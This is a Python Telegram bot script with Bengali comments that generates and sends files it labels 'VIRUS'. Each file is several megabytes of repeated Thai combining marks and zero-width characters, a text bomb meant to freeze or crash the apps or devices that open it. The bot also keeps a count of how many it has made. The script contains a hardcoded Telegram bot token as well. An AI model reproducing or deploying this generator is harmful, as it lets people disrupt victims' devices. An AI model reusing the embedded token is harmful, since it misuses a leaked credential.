import logging
import sqlite3
import os
import asyncio
import time
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ১. ক্লিন লগিং
logging.basicConfig(level=logging.WARNING)

# ২. আপনার টোকেন
TOKEN = "8675593212:AAE7hOxzjsJ_rgpkesUA67cfP221dSW98sw"

# ৩. ডাটাবেস
def init_db():
    conn = sqlite3.connect('mr_dev_fast.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, count INTEGER)''')
    cursor.execute("INSERT OR IGNORE INTO stats (id, count) VALUES (1, 0)")
    conn.commit()
    conn.close()

# ৪. ফাস্ট পেলোড জেনারেটর (অপ্টিমাইজড)
async def generate_fast_virus(status_msg):
    filename = f"V_{int(time.time())}.txt"
    # অত্যন্ত শক্তিশালী কিন্তু ছোট সাইজের প্যাটার্ন
    pattern = "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 50
    chunk = (pattern + "\u200B\u200C\u200D") * 300 
    
    try:
        await status_msg.edit_text("⏳ ডাটাবেস থেকে পেলোড লোড হচ্ছে...")
        # ফাইল সাইজ ৩-৫ MB এর মধ্যে রাখা হয়েছে দ্রুত ডেলিভারির জন্য
        with open(filename, "w", encoding="utf-8") as f:
            for _ in range(500): 
                f.write(chunk)
        
        await status_msg.edit_text("🚀 ১০০% সম্পন্ন! এখন টেলিগ্রামে ট্রান্সফার হচ্ছে...")
        return filename
    except Exception:
        return None

# ৫. হ্যান্ডলার
async def handle_requests(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text: return
    text = update.message.text

    if text == "/start":
        keyboard = [[KeyboardButton("🚀 CREATE VIRUS")], [KeyboardButton("📊 STATUS")]]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text("🔥 **M R DEVELOPER FAST PANEL** 🔥\nবট প্রস্তুত।", reply_markup=reply_markup)

    elif text == "🚀 CREATE VIRUS":
        status_msg = await update.message.reply_text("🚀 প্রসেস শুরু হয়েছে...")
        file_path = await generate_fast_virus(status_msg)
        
        if file_path and os.path.exists(file_path):
            try:
                with open(file_path, 'rb') as doc:
                    # কানেকশন টাইমআউট বাড়ানো হয়েছে
                    await update.message.reply_document(
                        document=doc, 
                        caption="✅ **VIRUS READY!**",
                        read_timeout=100,
                        write_timeout=100
                    )
                
                conn = sqlite3.connect('mr_dev_fast.db')
                cur = conn.cursor()
                cur.execute("UPDATE stats SET count = count + 1 WHERE id=1")
                conn.commit()
                conn.close()
            except Exception as e:
                await update.message.reply_text("❌ ডেলিভারি এরর! নেটওয়ার্ক স্লো। আবার ট্রাই করুন।")
            finally:
                if os.path.exists(file_path): os.remove(file_path)
        await status_msg.delete()

    elif text == "📊 STATUS":
        conn = sqlite3.connect('mr_dev_fast.db')
        cur = conn.cursor()
        cur.execute("SELECT count FROM stats WHERE id=1")
        total = cur.fetchone()[0]
        conn.close()
        await update.message.reply_text(f"📊 মোট তৈরি ভাইরাস: {total} টি।")

def main():
    init_db()
    # drop_pending_updates=True জমানো কনফ্লিক্ট ক্লিয়ার করবে
    application = Application.builder().token(TOKEN).build()
    application.add_handler(MessageHandler(filters.TEXT, handle_requests))
    print("M R DEVELOPER Bot is Live & Fast!")
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
    
